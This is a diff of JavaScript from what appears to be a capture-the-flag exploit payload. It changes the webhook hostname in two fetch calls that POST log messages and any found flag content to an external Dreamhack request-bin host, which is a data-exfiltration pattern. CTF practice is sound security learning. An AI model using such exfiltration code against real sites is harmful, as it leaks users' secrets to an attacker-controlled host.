@@ -17,7 +17,7 @@
             
             // 웹훅으로도 로그 전송
             try {
-                fetch('https://qniqmpt.request.dreamhack.games', {
+                fetch('https://cnbyzgj.request.dreamhack.games', {
                     method: 'POST',
                     body: `LOG: ${msg}`
                 }).catch(() => {});
@@ -75,7 +75,7 @@
                                 updateStatus(`🚩 FLAG FOUND: ${content}`);
                                 
                                 // 웹훅으로 전송
-                                await fetch('https://qniqmpt.request.dreamhack.games', {
+                                await fetch('https://cnbyzgj.request.dreamhack.games', {
                                     method: 'POST',
                                     body: `FLAG FOUND: ${content}`
                                 });
